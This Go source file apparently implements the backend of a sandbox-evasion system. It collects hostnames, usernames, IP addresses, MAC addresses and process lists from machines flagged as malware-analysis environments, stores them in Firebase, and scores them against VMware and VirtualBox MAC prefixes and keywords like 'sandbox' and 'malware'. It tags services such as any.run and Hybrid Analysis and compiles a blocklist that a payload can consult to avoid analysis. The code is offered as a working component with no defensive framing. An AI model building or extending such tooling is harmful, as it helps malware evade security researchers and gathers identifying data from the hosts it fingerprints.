package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// CloudStorage interface for different storage providers
type CloudStorage interface {
	Store(data SandboxEntry) error
	BatchStore(entries []SandboxEntry) error
	GetBlocklist() (Blocklist, error)
	CheckIfExists(hostname string) (bool, error)
}

// SandboxEntry represents a detected sandbox environment
type SandboxEntry struct {
	ID            string    `json:"id"`
	Hostname      string    `json:"hostname"`
	Username      string    `json:"username"`
	Domain        string    `json:"domain"`
	IPAddress     string    `json:"ip_address"`
	IPRange       string    `json:"ip_range"`
	MACAddresses  []string  `json:"mac_addresses"`
	Processes     []string  `json:"processes"`
	Confidence    float64   `json:"confidence"`
	FirstSeen     time.Time `json:"first_seen"`
	LastSeen      time.Time `json:"last_seen"`
	DetectionCount int      `json:"detection_count"`
	Tags          []string  `json:"tags"`
	Fingerprint   string    `json:"fingerprint"`
}

// Blocklist represents the compiled blocklist
type Blocklist struct {
	Hostnames    []string          `json:"hostnames"`
	Usernames    []string          `json:"usernames"`
	IPRanges     []string          `json:"ip_ranges"`
	MACPrefixes  []string          `json:"mac_prefixes"`
	Processes    []string          `json:"processes"`
	UpdatedAt    time.Time         `json:"updated_at"`
	EntryCount   int               `json:"entry_count"`
	Metadata     map[string]string `json:"metadata"`
}

// FirebaseStorage implements CloudStorage for Firebase
type FirebaseStorage struct {
	projectID   string
	apiKey      string
	databaseURL string
	client      *http.Client
	mu          sync.RWMutex
	cache       map[string]bool
}

// NewFirebaseStorage creates a new Firebase storage instance
func NewFirebaseStorage(projectID, apiKey, databaseURL string) *FirebaseStorage {
	return &FirebaseStorage{
		projectID:   projectID,
		apiKey:      apiKey,
		databaseURL: databaseURL,
		client:      &http.Client{Timeout: 15 * time.Second},
		cache:       make(map[string]bool),
	}
}

// Store saves a single sandbox entry to Firebase
func (fs *FirebaseStorage) Store(entry SandboxEntry) error {
	// Check if already exists
	exists, _ := fs.CheckIfExists(entry.Hostname)
	if exists {
		// Update existing entry
		return fs.updateEntry(entry)
	}
	
	// Create new entry
	entry.FirstSeen = time.Now().UTC()
	entry.LastSeen = time.Now().UTC()
	entry.DetectionCount = 1
	
	// Generate unique ID
	entry.ID = generateUniqueID(entry)
	
	// Calculate confidence score
	entry.Confidence = calculateConfidence(entry)
	
	// Detect IP range
	if entry.IPAddress != "" {
		entry.IPRange = detectIPRange(entry.IPAddress)
	}
	
	// Add tags based on detection patterns
	entry.Tags = generateTags(entry)
	
	// Store in Firebase
	url := fmt.Sprintf("%s/sandboxes/%s.json?auth=%s", 
		fs.databaseURL, entry.ID, fs.apiKey)
	
	jsonData, err := json.Marshal(entry)
	if err != nil {
		return fmt.Errorf("failed to marshal entry: %w", err)
	}
	
	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := fs.client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to store entry: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("firebase returned status %d: %s", resp.StatusCode, string(body))
	}
	
	// Update cache
	fs.mu.Lock()
	fs.cache[entry.Hostname] = true
	fs.mu.Unlock()
	
	return nil
}

// updateEntry updates an existing sandbox entry
func (fs *FirebaseStorage) updateEntry(entry SandboxEntry) error {
	// Get existing entry
	url := fmt.Sprintf("%s/sandboxes.json?orderBy=\"hostname\"&equalTo=\"%s\"&auth=%s",
		fs.databaseURL, entry.Hostname, fs.apiKey)
	
	resp, err := fs.client.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	var result map[string]SandboxEntry
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return err
	}
	
	for id, existing := range result {
		// Update detection count and last seen
		existing.LastSeen = time.Now().UTC()
		existing.DetectionCount++
		
		// Merge new data
		if entry.IPAddress != "" && existing.IPAddress == "" {
			existing.IPAddress = entry.IPAddress
			existing.IPRange = detectIPRange(entry.IPAddress)
		}
		
		// Merge MAC addresses
		existing.MACAddresses = mergeUnique(existing.MACAddresses, entry.MACAddresses)
		
		// Merge processes
		existing.Processes = mergeUnique(existing.Processes, entry.Processes)
		
		// Recalculate confidence
		existing.Confidence = calculateConfidence(existing)
		
		// Update in Firebase
		updateURL := fmt.Sprintf("%s/sandboxes/%s.json?auth=%s", 
			fs.databaseURL, id, fs.apiKey)
		
		jsonData, _ := json.Marshal(existing)
		req, _ := http.NewRequest("PUT", updateURL, bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		
		_, err := fs.client.Do(req)
		return err
	}
	
	return nil
}

// BatchStore saves multiple entries at once
func (fs *FirebaseStorage) BatchStore(entries []SandboxEntry) error {
	batchData := make(map[string]SandboxEntry)
	
	for _, entry := range entries {
		entry.ID = generateUniqueID(entry)
		entry.FirstSeen = time.Now().UTC()
		entry.LastSeen = time.Now().UTC()
		entry.DetectionCount = 1
		entry.Confidence = calculateConfidence(entry)
		
		if entry.IPAddress != "" {
			entry.IPRange = detectIPRange(entry.IPAddress)
		}
		
		entry.Tags = generateTags(entry)
		batchData[entry.ID] = entry
	}
	
	url := fmt.Sprintf("%s/sandboxes.json?auth=%s", fs.databaseURL, fs.apiKey)
	
	jsonData, err := json.Marshal(batchData)
	if err != nil {
		return err
	}
	
	req, err := http.NewRequest("PATCH", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := fs.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

// CheckIfExists checks if a hostname already exists in the database
func (fs *FirebaseStorage) CheckIfExists(hostname string) (bool, error) {
	// Check cache first
	fs.mu.RLock()
	if exists, ok := fs.cache[hostname]; ok {
		fs.mu.RUnlock()
		return exists, nil
	}
	fs.mu.RUnlock()
	
	// Query Firebase
	url := fmt.Sprintf("%s/sandboxes.json?orderBy=\"hostname\"&equalTo=\"%s\"&auth=%s",
		fs.databaseURL, hostname, fs.apiKey)
	
	resp, err := fs.client.Get(url)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	
	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return false, err
	}
	
	exists := len(result) > 0
	
	// Update cache
	fs.mu.Lock()
	fs.cache[hostname] = exists
	fs.mu.Unlock()
	
	return exists, nil
}

// GetBlocklist retrieves the compiled blocklist from the database
func (fs *FirebaseStorage) GetBlocklist() (Blocklist, error) {
	blocklist := Blocklist{
		Hostnames:   []string{},
		Usernames:   []string{},
		IPRanges:    []string{},
		MACPrefixes: []string{},
		Processes:   []string{},
		UpdatedAt:   time.Now().UTC(),
		Metadata:    make(map[string]string),
	}
	
	// Get all sandbox entries
	url := fmt.Sprintf("%s/sandboxes.json?auth=%s", fs.databaseURL, fs.apiKey)
	
	resp, err := fs.client.Get(url)
	if err != nil {
		return blocklist, err
	}
	defer resp.Body.Close()
	
	var entries map[string]SandboxEntry
	if err := json.NewDecoder(resp.Body).Decode(&entries); err != nil {
		return blocklist, err
	}
	
	// Compile unique values
	hostnameMap := make(map[string]bool)
	usernameMap := make(map[string]bool)
	ipRangeMap := make(map[string]bool)
	macPrefixMap := make(map[string]bool)
	processMap := make(map[string]bool)
	
	for _, entry := range entries {
		// Only include high confidence entries
		if entry.Confidence >= 0.7 {
			hostnameMap[entry.Hostname] = true
			if entry.Username != "" {
				usernameMap[entry.Username] = true
			}
			if entry.IPRange != "" {
				ipRangeMap[entry.IPRange] = true
			}
			
			// Extract MAC prefixes
			for _, mac := range entry.MACAddresses {
				if len(mac) >= 8 {
					prefix := mac[:8]
					macPrefixMap[prefix] = true
				}
			}
			
			// Add processes
			for _, proc := range entry.Processes {
				processMap[proc] = true
			}
		}
	}
	
	// Convert maps to slices
	for hostname := range hostnameMap {
		blocklist.Hostnames = append(blocklist.Hostnames, hostname)
	}
	for username := range usernameMap {
		blocklist.Usernames = append(blocklist.Usernames, username)
	}
	for ipRange := range ipRangeMap {
		blocklist.IPRanges = append(blocklist.IPRanges, ipRange)
	}
	for macPrefix := range macPrefixMap {
		blocklist.MACPrefixes = append(blocklist.MACPrefixes, macPrefix)
	}
	for process := range processMap {
		blocklist.Processes = append(blocklist.Processes, process)
	}
	
	blocklist.EntryCount = len(entries)
	blocklist.Metadata["total_hostnames"] = fmt.Sprintf("%d", len(blocklist.Hostnames))
	blocklist.Metadata["total_ip_ranges"] = fmt.Sprintf("%d", len(blocklist.IPRanges))
	
	return blocklist, nil
}

// Helper functions

func generateUniqueID(entry SandboxEntry) string {
	return fmt.Sprintf("%s_%s_%d", 
		strings.ReplaceAll(entry.Hostname, ".", "_"),
		strings.ReplaceAll(entry.Username, ".", "_"),
		time.Now().Unix())
}

func calculateConfidence(entry SandboxEntry) float64 {
	confidence := 0.0
	
	// Check for known sandbox patterns
	knownPatterns := []string{"sandbox", "malware", "analysis", "vm", "virtual", "test"}
	hostname := strings.ToLower(entry.Hostname)
	
	for _, pattern := range knownPatterns {
		if strings.Contains(hostname, pattern) {
			confidence += 0.2
		}
	}
	
	// Check MAC addresses
	sandboxMACs := []string{"00:0C:29", "00:1C:14", "00:50:56", "00:05:69", "08:00:27"}
	for _, mac := range entry.MACAddresses {
		for _, sandboxMAC := range sandboxMACs {
			if strings.HasPrefix(mac, sandboxMAC) {
				confidence += 0.3
				break
			}
		}
	}
	
	// Check processes
	if len(entry.Processes) > 0 {
		confidence += 0.2
	}
	
	// Detection count factor
	if entry.DetectionCount > 5 {
		confidence += 0.2
	}
	
	// Cap at 1.0
	if confidence > 1.0 {
		confidence = 1.0
	}
	
	return confidence
}

func detectIPRange(ipAddress string) string {
	ip := net.ParseIP(ipAddress)
	if ip == nil {
		return ""
	}
	
	// Get /24 subnet
	if ip.To4() != nil {
		parts := strings.Split(ipAddress, ".")
		if len(parts) == 4 {
			return fmt.Sprintf("%s.%s.%s.0/24", parts[0], parts[1], parts[2])
		}
	}
	
	return ""
}

func generateTags(entry SandboxEntry) []string {
	tags := []string{}
	
	// VM type detection
	if containsVMwareIndicators(entry) {
		tags = append(tags, "vmware")
	}
	if containsVirtualBoxIndicators(entry) {
		tags = append(tags, "virtualbox")
	}
	
	// Analysis platform detection
	hostname := strings.ToLower(entry.Hostname)
	if strings.Contains(hostname, "any.run") {
		tags = append(tags, "any.run")
	}
	if strings.Contains(hostname, "hybrid") {
		tags = append(tags, "hybrid-analysis")
	}
	
	// Confidence level
	if entry.Confidence >= 0.9 {
		tags = append(tags, "high-confidence")
	} else if entry.Confidence >= 0.7 {
		tags = append(tags, "medium-confidence")
	}
	
	return tags
}

func containsVMwareIndicators(entry SandboxEntry) bool {
	// Check MAC addresses
	for _, mac := range entry.MACAddresses {
		if strings.HasPrefix(mac, "00:0C:29") || 
		   strings.HasPrefix(mac, "00:1C:14") || 
		   strings.HasPrefix(mac, "00:50:56") {
			return true
		}
	}
	
	// Check processes
	for _, proc := range entry.Processes {
		if strings.Contains(strings.ToLower(proc), "vmware") ||
		   strings.Contains(strings.ToLower(proc), "vmtool") {
			return true
		}
	}
	
	return false
}

func containsVirtualBoxIndicators(entry SandboxEntry) bool {
	// Check MAC addresses
	for _, mac := range entry.MACAddresses {
		if strings.HasPrefix(mac, "08:00:27") {
			return true
		}
	}
	
	// Check processes
	for _, proc := range entry.Processes {
		if strings.Contains(strings.ToLower(proc), "vbox") {
			return true
		}
	}
	
	return false
}

func mergeUnique(existing, new []string) []string {
	uniqueMap := make(map[string]bool)
	
	for _, item := range existing {
		uniqueMap[item] = true
	}
	
	for _, item := range new {
		uniqueMap[item] = true
	}
	
	result := []string{}
	for item := range uniqueMap {
		result = append(result, item)
	}
	
	return result
}